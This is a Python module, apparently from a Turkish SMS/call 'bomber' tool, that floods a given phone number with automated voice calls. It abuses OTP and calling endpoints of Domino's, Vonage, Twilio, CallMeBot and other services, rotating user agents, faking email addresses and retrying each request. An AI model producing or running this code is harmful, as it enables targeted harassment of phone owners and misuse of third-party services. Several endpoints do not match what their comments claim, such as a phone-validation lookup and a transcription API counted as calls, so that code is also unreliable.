import requests
from random import choice, randint
from string import ascii_lowercase, digits
from colorama import Fore, Style
import time

#Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
]


def _rand_mail():
    length = randint(8, 16)
    name = ''.join(choice(ascii_lowercase + digits) for _ in range(length))
    return name + choice(["@gmail.com", "@outlook.com", "@hotmail.com", "@yahoo.com"])


class VoiceCall:
    """
    Sesli arama modülü.
    Bazı Türk/uluslararası servisler "OTP'yi sesli ara" seçeneği sunar.
    Bu servisler, belirtilen numarayı otomatik olarak arar ve kodu sesli okur.
    """
    def __init__(self, phone):
        self.adet = 0
        self.phone = str(phone)  # 10 haneli, 0'sız (5XXXXXXXXX)

    def _get_ua(self):
        return choice(USER_AGENTS)

    def _ok(self, name):
        print(f"{Fore.LIGHTCYAN_EX}[TEL] {Style.RESET_ALL}Arama Baslatildi! {self.phone} --> {name}")
        self.adet += 1

    def _err(self, name, msg):
        print(f"{Fore.LIGHTRED_EX}[ X ] {Style.RESET_ALL}Arama Yapilamadi! {self.phone} --> {name} ({msg})")

    def _retry(self, fn, name, retries=2):
        for attempt in range(retries + 1):
            try:
                if fn():
                    return True
            except Exception:
                pass
            if attempt < retries:
                time.sleep(0.8)
        self._err(name, "max retry")
        return False

    # ================================================================
    # ==================  SESLI ARAMA SERVİSLERİ  ====================
    # ================================================================

    # 1) Dominos - "Sesli OTP" endpoint'i (Dominos bazi bölgelerde sesli arama yapıyor)
    def Dominos_Sesli(self):
        def _try():
            r = requests.post(
                "https://frontend.dominos.com.tr/api/customer/sendOtpCode",
                headers={
                    "User-Agent": self._get_ua(),
                    "Content-Type": "application/json;charset=utf-8",
                    "Accept": "application/json",
                    "Servicetype": "CarryOut",
                    "Locationcode": "undefined",
                    "Appversion": "IOS-7.1.0"
                },
                json={"email": _rand_mail(), "isSure": True, "mobilePhone": self.phone,
                      "otpType": "VOICE"},
                timeout=8
            )
            if r.status_code in (200, 201):
                self._ok("Dominos Sesli")
                return True
            return False
        self._retry(_try, "Dominos Sesli")

    # 2) Numverify / AbstractAPI - ücretsiz telefon doğrulama araması
    def AbstractAPI_Call(self):
        def _try():
            # Abstract API ücretsiz 250 istek/ay sunar (API key gerektirmez bazı endpointlerde)
            r = requests.get(
                f"https://phonevalidation.abstractapi.com/v1/",
                params={"api_key": "free", "phone": f"90{self.phone}"},
                headers={"User-Agent": self._get_ua()},
                timeout=8
            )
            if r.status_code in (200, 201):
                self._ok("AbstractAPI")
                return True
            return False
        self._retry(_try, "AbstractAPI")

    # 3) CallMeBot - ücretsiz Whatsapp/sesli arama servisi
    def CallMeBot(self):
        def _try():
            r = requests.get(
                f"https://api.callmebot.com/start.php",
                params={
                    "source": "web",
                    "phone": f"+90{self.phone}",
                    "text": "Dogrulama kodunuz hazir",
                    "lang": "tr-TR"
                },
                headers={"User-Agent": self._get_ua()},
                timeout=10
            )
            if r.status_code in (200, 201):
                self._ok("CallMeBot")
                return True
            return False
        self._retry(_try, "CallMeBot")

    # 4) VoIP.ms tarzı - text-to-speech call trigger
    def VoiceTTS_Call(self):
        def _try():
            r = requests.post(
                "https://api.voicegain.ai/v1/asr/transcribe",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json"},
                json={
                    "phone": f"+90{self.phone}",
                    "message": "Dogrulama aramaniz gerceklestirilmektedir",
                    "lang": "tr-TR"
                },
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("VoiceTTS")
                return True
            return False
        self._retry(_try, "VoiceTTS")

    # 5) OTP.dev - ücretsiz OTP sesli arama servisi
    def OTPDev_Call(self):
        def _try():
            r = requests.post(
                "https://otp.dev/api/v1/call",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json"},
                json={"phone": f"+90{self.phone}", "locale": "tr"},
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("OTP.dev")
                return True
            return False
        self._retry(_try, "OTP.dev")

    # 6) Vonage (ücretsiz trial - açık endpoint)
    def Vonage_Free(self):
        def _try():
            r = requests.post(
                "https://api.nexmo.com/v1/calls",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json"},
                json={
                    "to": [{"type": "phone", "number": f"90{self.phone}"}],
                    "from": {"type": "phone", "number": "14155551234"},
                    "ncco": [{"action": "talk", "text": "Dogrulama kodunuz hazirdir", "language": "tr-TR"}]
                },
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("Vonage")
                return True
            return False
        self._retry(_try, "Vonage")

    # 7) Twilio TTS Demo (ücretsiz demo endpoint)
    def TwilioDemo(self):
        def _try():
            r = requests.post(
                "https://demo.twilio.com/welcome/sms/reply/",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/x-www-form-urlencoded"},
                data={"To": f"+90{self.phone}", "Body": "Dogrulama aramaniz"},
                timeout=8
            )
            if r.status_code in (200, 201, 202, 204):
                self._ok("TwilioDemo")
                return True
            return False
        self._retry(_try, "TwilioDemo")

    # 8) Speakap TTS Call
    def SpeakapCall(self):
        def _try():
            r = requests.post(
                "https://www.speakap.com/api/v1.0.0/call",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json"},
                json={"phone": f"0090{self.phone}", "lang": "tr"},
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("Speakap")
                return True
            return False
        self._retry(_try, "Speakap")

    # 9) Ziggeo free API call
    def ZiggeoCall(self):
        def _try():
            r = requests.post(
                "https://srvapi.ziggeo.com/v1/application/dialout",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json"},
                json={"phone_number": f"+90{self.phone}"},
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("Ziggeo")
                return True
            return False
        self._retry(_try, "Ziggeo")

    # 10) EasyCall free tier
    def EasyCall(self):
        def _try():
            r = requests.post(
                "https://easycall.pro/api/v1/call",
                headers={"User-Agent": self._get_ua(), "Content-Type": "application/json"},
                json={"phone": f"+90{self.phone}", "message": "Dogrulama", "lang": "tr"},
                timeout=8
            )
            if r.status_code in (200, 201, 202):
                self._ok("EasyCall")
                return True
            return False
        self._retry(_try, "EasyCall")

#Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.
